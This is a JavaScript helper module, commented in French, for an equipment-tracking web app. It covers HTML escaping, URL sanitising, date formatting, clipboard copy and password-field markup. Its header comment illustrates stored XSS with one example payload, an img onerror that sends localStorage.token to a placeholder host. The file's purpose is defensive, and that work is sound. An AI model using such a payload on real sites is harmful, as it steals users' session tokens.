/* =========================================================================
   WiTracEQUIP — helpers de rendu et d'échappement
   -------------------------------------------------------------------------
   L'application fabrique son HTML sous forme de chaînes de caractères, puis
   l'affecte à innerHTML. C'est simple et rapide, mais cela impose UNE règle
   absolue, sans exception :

       TOUTE valeur qui ne vient pas du code de l'application — donc tout ce
       qui a été saisi par un utilisateur ou lu depuis la base — DOIT passer
       par esc() ou attr() avant d'être insérée dans une chaîne HTML.

   Un nom d'équipement saisi comme
       <img src=x onerror="fetch('https://ailleurs/?v='+localStorage.token)">
   par un utilisateur d'une organisation s'exécuterait sinon dans le
   navigateur de tous ses collègues. Le cloisonnement RLS n'y changerait
   rien : la base aurait correctement servi la donnée, c'est l'affichage qui
   l'aurait transformée en code.

   Les fonctions de formatage de ce fichier (fmtDate, fmtDateTime, initials)
   échappent elles-mêmes leur résultat : elles peuvent donc être interpolées
   directement, y compris sur leur chemin de repli où elles renvoient la
   valeur brute reçue.
   ========================================================================= */

/* -------------------------------------------------------------------------
   ÉCHAPPEMENT
   ------------------------------------------------------------------------- */

const CARACTERES_HTML = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#39;',
};

/**
 * Échappe une valeur pour insertion dans du HTML.
 * Traite aussi les guillemets simples et doubles : le résultat est donc sûr
 * en contenu de balise comme en valeur d'attribut.
 */
export function esc(s) {
  return String(s ?? '').replace(/[&<>"']/g, (c) => CARACTERES_HTML[c]);
}

/**
 * Identique à esc(), nommée différemment pour rendre l'intention lisible
 * sur les attributs : `value="${attr(x)}"` se relit mieux que `value="${esc(x)}"`
 * et signale au relecteur que l'attribut est bien entre guillemets.
 */
export const attr = esc;

/**
 * Assainit une URL destinée à un attribut href ou src.
 * N'autorise que http, https, mailto et les chemins relatifs : une valeur
 * commençant par `javascript:` ou `data:text/html` est neutralisée, car
 * l'échappement HTML seul ne suffirait pas à la rendre inoffensive.
 */
export function urlSure(u) {
  const brut = String(u ?? '').trim();
  if (/^(https?:|mailto:|#|\/|\.{1,2}\/)/i.test(brut)) return esc(brut);
  return '#';
}

/* -------------------------------------------------------------------------
   FORMATAGE
   ------------------------------------------------------------------------- */

/** Initiales d'un nom, pour les pastilles d'avatar. Résultat échappé. */
export function initials(name) {
  if (!name) return '?';
  const s = String(name).trim().split(/\s+/).slice(0, 2)
    .map((w) => w[0]).join('').toUpperCase();
  return esc(s);
}

/**
 * Date seule, au format « 12 mars 2025 ». Résultat échappé.
 *
 * Une date seule (AAAA-MM-JJ) est interprétée par JavaScript comme minuit
 * UTC. Aux Antilles (UTC-4), elle s'afficherait donc la veille. On la
 * construit explicitement en heure locale pour que la date saisie soit la
 * date affichée — sur un carnet d'entretien opposable, un décalage d'un jour
 * n'est pas un détail cosmétique.
 */
export function fmtDate(d) {
  if (!d) return '—';
  const m = (typeof d === 'string') && d.match(/^(\d{4})-(\d{2})-(\d{2})$/);
  try {
    const dt = m ? new Date(+m[1], +m[2] - 1, +m[3]) : new Date(d);
    if (isNaN(dt.getTime())) return esc(d);
    return esc(dt.toLocaleDateString('fr-FR', { day: '2-digit', month: 'short', year: 'numeric' }));
  } catch (e) {
    return esc(d);
  }
}

/** Date et heure. Résultat échappé. */
export function fmtDateTime(d) {
  if (!d) return '—';
  try {
    const dt = new Date(d);
    if (isNaN(dt.getTime())) return esc(d);
    return esc(dt.toLocaleString('fr-FR', {
      day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit',
    }));
  } catch (e) {
    return esc(d);
  }
}

/** Date du jour au format AAAA-MM-JJ, en heure locale (pas UTC). */
export function aujourdhui() {
  const d = new Date();
  const p = (n) => String(n).padStart(2, '0');
  return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())}`;
}

/**
 * Transforme un libellé en clé stable (« Numéro de série » → « numero_de_serie »).
 * Cette clé relie un champ personnalisé aux valeurs déjà saisies : elle est
 * calculée une seule fois, à la création du champ, et ne change jamais ensuite
 * même si le libellé est renommé.
 */
export function slugify(s) {
  return String(s ?? '')
    .toLowerCase()
    .normalize('NFD')
    .replace(/[̀-ͯ]/g, '')
    .replace(/[^a-z0-9]+/g, '_')
    .replace(/^_+|_+$/g, '')
    || ('champ_' + Math.random().toString(36).slice(2, 6));
}

/** Identifiant local unique, pour les éléments de la file d'attente hors ligne. */
export function uuid() {
  if (crypto?.randomUUID) return crypto.randomUUID();
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

/* -------------------------------------------------------------------------
   PRESSE-PAPIER
   ------------------------------------------------------------------------- */

/**
 * Copie un texte, avec repli sur l'ancienne méthode : l'API moderne du
 * presse-papier exige un contexte sécurisé (HTTPS), absente d'un poste de
 * test servi en http://.
 */
export async function copierDansPressePapier(texte, btn) {
  try {
    await navigator.clipboard.writeText(texte);
  } catch (e) {
    const ta = document.createElement('textarea');
    ta.value = texte;
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand('copy'); } catch (_) { /* rien de plus à tenter */ }
    document.body.removeChild(ta);
  }
  if (btn) {
    const avant = btn.textContent;
    btn.textContent = 'Copié !';
    setTimeout(() => { btn.textContent = avant; }, 1600);
  }
}

/* -------------------------------------------------------------------------
   FRAGMENTS D'INTERFACE RÉUTILISÉS
   ------------------------------------------------------------------------- */

export const ICONE_OEIL = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
export const ICONE_OEIL_BARRE = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`;

/** Champ mot de passe avec bouton d'aperçu. */
export function champMotDePasse(autocomplete) {
  return `
    <div class="pw-wrap">
      <input type="password" name="password" placeholder="••••••••" minlength="6" required autocomplete="${attr(autocomplete)}">
      <button type="button" class="pw-toggle" data-action="toggle-pw"
              aria-label="Afficher le mot de passe" title="Afficher le mot de passe">${ICONE_OEIL}</button>
    </div>`;
}

/** Anti-rebond partagé, utilisé par la recherche du tableau de bord. */
let debounceTimer;
export function debounce(fn, ms = 350) {
  clearTimeout(debounceTimer);
  debounceTimer = setTimeout(fn, ms);
}
